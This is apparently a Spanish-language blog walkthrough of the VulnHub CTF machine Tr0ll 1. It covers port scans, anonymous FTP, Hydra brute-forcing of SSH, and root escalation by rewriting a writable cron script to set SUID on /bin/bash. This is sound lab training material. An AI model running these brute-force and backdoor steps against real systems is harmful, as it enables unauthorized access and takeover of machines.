---
layout: single
title: Tr0ll 1 - VulnHub
excerpt: " Tr0ll was inspired by the constant trolling of the machines within the OSCP labs. The goal is simple, gain root and get Proof.txt from the /root directory. Not for the easily frustrated! Fair warning, there be trolls ahead! "
date: 2023-02-27
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-troll/troll.png
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:
  - FTP
  - PSPY
  - CTF
  - Wireshark
  - pcap
  - Python
  - Hydra
---

Tr0ll was inspired by the constant trolling of the machines within the OSCP labs. The goal is simple, gain root and get Proof.txt from the /root directory. Not for the easily frustrated! Fair warning, there be trolls ahead!

# Summary
- IP: 192.168.1.41
- Ports: 21,22,80
- OS: Linux (Ubuntu)
- Services & Applications:
	-  21 -> vsftpd 3.0.2
	-  22 -> OpenSSH 6.6.1p1 Ubuntu 2ubuntu2
	-  80 -> Apache httpd 2.4.7

# Recon

- Escaneo básico de puertos:  

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 192.168.1.41 -oG allPorts
```


- Escaneo profundo de puertos encontrados:  

```bash
$nmap -p21,22,80 -sCV 192.168.1.41 -oN targeted
```

# Escaneo FTP (Como anonymous):

```bash
$ftp 192.168.1.41
```

- Encontramos un archivo `"lol.pcap"`, lo descargamos a nuestra máquina atacante:

```
ftp> get lol.pcap
```

# Análisis de archivo .pcap:

- Abrimos el archivo descargado con `wireshark` y encontramos varios paquetes TCP y FTP; si buscamos bien entre los paquetes `FTP DATA` veremos en texto más o menos claro lo siguiente:

```js
0000   00 0c 29 5d 04 92 00 0c 29 20 70 99 08 00 45 08   ..)]....) p...E.
0010   00 c7 4f eb 40 00 40 06 d6 2c 0a 00 00 06 0a 00   ..O.@.@..,......
0020   00 0c 00 14 ca ac 45 83 8b 6b 48 0b cb 56 80 18   ......E..kH..V..
0030   03 91 82 f4 00 00 01 01 08 0a 00 1a c4 83 00 05   ................
0040   e1 57 57 65 6c 6c 2c 20 77 65 6c 6c 2c 20 77 65   .WWell, well, we
0050   6c 6c 2c 20 61 72 65 6e 27 74 20 79 6f 75 20 6a   ll, aren't you j
0060   75 73 74 20 61 20 63 6c 65 76 65 72 20 6c 69 74   ust a clever lit
0070   74 6c 65 20 64 65 76 69 6c 2c 20 79 6f 75 20 61   tle devil, you a
0080   6c 6d 6f 73 74 20 66 6f 75 6e 64 20 74 68 65 20   lmost found the 
0090   73 75 70 33 72 73 33 63 72 33 74 64 69 72 6c 6f   sup3rs3cr3tdirlo
00a0   6c 20 3a 2d 50 0a 0a 53 75 63 6b 73 2c 20 79 6f   l :-P..Sucks, yo
00b0   75 20 77 65 72 65 20 73 6f 20 63 6c 6f 73 65 2e   u were so close.
00c0   2e 2e 20 67 6f 74 74 61 20 54 52 59 20 48 41 52   .. gotta TRY HAR
00d0   44 45 52 21 0a                                    DER!.
```

- Como se trata de un `CTF` puede que esta sea una pista para un posterior análisis.


# Análisis de página web:

- Si hacemos un escaneo de directorios con gobuster no encontraremos nada relevante.

- Recordamos la pista encontrada en el archivo `"lol.pcap"`; nos hablaba de una supuesta dirección `"sp3rs3cr3tdirlol"`, así que accedemos a esta.

```
http://192.168.1.41/sup3rs3cr3tdirlol/
```

- Encontramos un archivo llamado `"roflmao"`, lo descargamos y lo analizamos:

```bash
$file roflmao
```

- Se trata de un `binario` ejecutable para Linux, lo ejecutamos:

```bash
$./roflmao
```

```
Find address 0x0856BF to proceed
```

- Nos dice que encontremos la dirección `"0x0856BF"` para proceder; podríamos pensar que es un número en hexadecimal, sin embargo, se trata de un directorio ubicado en el mismo enlace de la página inicial, así que accedemos:

```
http://192.168.1.41/0x0856BF/
```


- Vemos dos carpetas, una `"good_luck/"` y otra `"this_folder_contains_the_password/"`, en la primera encontramos un archivo con posibles usuarios del sistema víctima, así que los guardamos en un archivo "users.txt".

- El segundo directorio contiene un archivo "Pass.txt" el cual al abrirlo nos dice "Good_job_:)", podríamos pensar en acceder con uno de los usuarios del archivo descargado en el paso anterior con esta contraseña, sin embargo, al ser una máquina "Troll" la contraseña correcta es el nombre del archivo contenido en la carpeta actual, es decir `"Pass.txt"`, esto lo comprobamos haciendo un ataque de fuerza bruta con hydra:

```bash
$hydra -L users.txt -p Pass.txt ssh://192.168.1.41 -t 30
```

```
[22][ssh] host: 192.168.1.41   login: overflow   password: Pass.txt
```

- Encontramos que la credencial "Pass.txt" es correcta para el usuario `"overflow"` así que entramos por SSH:

```
$ssh overflow@192.168.1.41
```


# ESCALANDO PRIVILEGIOS:


- Escaneamos los procesos que se ejecutan en segundo plano de forma automatizada con `PSPY` (habiendo transferido el binario de PSPY32 previamente):

- Luego de un rato, vemos que se ejecuta lo siguiente:

```bash
2023/02/27 15:10:01 CMD: UID=0     PID=1323   | CRON 
2023/02/27 15:10:01 CMD: UID=0     PID=1324   | /usr/bin/python /lib/log/cleaner.py 
2023/02/27 15:10:01 CMD: UID=0     PID=1325   | CRON 
2023/02/27 15:10:01 CMD: UID=0     PID=1326   | /usr/bin/python /opt/lmao.py 
2023/02/27 15:10:01 CMD: UID=0     PID=1327   | /usr/bin/python /opt/lmao.py 
2023/02/27 15:10:01 CMD: UID=0     PID=1328   | sh -c echo "TIMES UP LOL!"|wall 
2023/02/27 15:10:01 CMD: UID=0     PID=1329   | sh -c echo "TIMES UP LOL!"|wall 
2023/02/27 15:10:01 CMD: UID=0     PID=1330   | 
                                                                               
Broadcast Message from root@trol                                               
        (somewhere) at 15:10 ...                                               
                                                                               
TIMES UP LOL!                                                                  
                                                                               
2023/02/27 15:10:01 CMD: UID=0     PID=1331   | sh -c rm -r /tmp/*  
2023/02/27 15:10:01 CMD: UID=0     PID=1332   | /usr/bin/python /opt/lmao.py 
2023/02/27 15:10:01 CMD: UID=0     PID=1333   | sh -c pkill -u 'overflow' 
```

- Acto seguido nos echa del sistema, si volvemos a acceder como "overflow" y analizamos el archivo que se ejecuta automáticamente `"/ib/log/cleaner.py"` vemos el contenido:

```python
#!/usr/bin/env python
import os
import sys
try:
	os.system('rm -r /tmp/* ')
except:
	sys.exit()
```

- Vemos que este archivo se encarga de borrar lo que hay en el directorio "/tmp", sin embargo, tenemos permisos de escritura, así que podemos modificarlo a nuestro antojo para que ejecute el `comando` que queramos, en este caso, le daremos permisos `SUID` a la bash:

```bash
$nano /lib/log/cleaner.py
```

```python
#!/usr/bin/env python
import os
import sys
try:
	os.system('chmod u+s /bin/bash ')
except:
	sys.exit()
```

- Ahora solo esperamos a que se ejecute la tarea automática y el comando que nosotros hemos inyectado.

- Cuando nos eche del sistema, volvemos a ingresar y ejecutamos la bash con privilegios y seremos root:

```bash
$bash -p
```

#### EXTRA:

- Para evitar que nos eche del sistema cada cierto tiempo, como root podremos eliminar el archivo "/opt/lmao" el cual es el responsable de la ejecución de aquella tarea.
